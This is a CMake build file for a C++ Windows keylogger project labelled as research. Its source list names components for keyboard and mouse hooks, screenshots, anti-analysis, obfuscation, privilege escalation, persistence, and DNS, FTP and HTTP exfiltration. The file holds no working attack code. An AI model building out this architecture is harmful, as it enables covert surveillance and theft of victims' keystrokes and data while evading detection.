# KeyLoggerClient/CMakeLists.txt (updated)
cmake_minimum_required(VERSION 3.15)
project(KeyloggerResearchProject)

set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED ON)

# Windows-specific settings
if(WIN32)
    add_definitions(-DWIN32 -D_WINDOWS -D_UNICODE -DUNICODE)
    set(CMAKE_WINDOWS_EXPORT_ALL_SYMBOLS ON)
else()
    # Cross-compilation settings
    add_definitions(-DCROSS_COMPILE)
endif()

list(APPEND CMAKE_MODULE_PATH "${CMAKE_SOURCE_DIR}/cmake")

# Include directories
include_directories(
    include
    include/core
    include/data
    include/hooks
    include/security
    include/utils
    include/communication
    include/persistence
)

# Find Windows SDK (simulated for cross-compilation)
find_package(WindowsSDK REQUIRED)
include_directories(${WINDOWSSDK_INCLUDE_DIRS})

# Find additional dependencies
find_package(Crypto REQUIRED)
include_directories(${CRYPTO_INCLUDE_DIRS})

# Source files
set(SOURCES
    src/main.cpp
    src/core/Application.cpp
    src/core/Configuration.cpp
    src/core/Logger.cpp
    src/data/DataManager.cpp
    src/data/KeyData.cpp
    src/data/Screenshot.cpp
    src/data/SystemData.cpp
    src/hooks/KeyHook.cpp
    src/hooks/MouseHook.cpp
    src/hooks/SystemHook.cpp
    src/security/AntiAnalysis.cpp
    src/security/Encryption.cpp
    src/security/Obfuscation.cpp
    src/security/PrivilegeEscalation.cpp
    src/utils/FileUtils.cpp
    src/utils/StringUtils.cpp
    src/utils/SystemUtils.cpp
    src/utils/TimeUtils.cpp
    src/communication/CommsManager.cpp
    src/communication/DnsComms.cpp
    src/communication/FtpComms.cpp
    src/communication/HttpComms.cpp
    src/persistence/PersistenceManager.cpp
    src/persistence/RegistryPersistence.cpp
    src/persistence/SchedulePersistence.cpp
    src/persistence/ServicePersistence.cpp
)

# Add executable
add_executable(KeyloggerResearchProject ${SOURCES})

# Link libraries
target_link_libraries(KeyloggerResearchProject
    ${WINDOWSSDK_LIBRARIES}
    ${CRYPTO_LIBRARIES}
)

# Cross-compilation specific libraries
if(NOT WIN32)
    target_link_libraries(KeyloggerResearchProject
        -lwinhttp
        -lwininet
        -ldnsapi
        -ltaskschd
        -lpsapi
        -liphlpapi
        -lgdiplus
        -lshlwapi
        -lole32
        -loleaut32
        -luuid
    )
endif()

# Copy configuration files
file(COPY resources/config/default.cfg DESTINATION ${CMAKE_BINARY_DIR})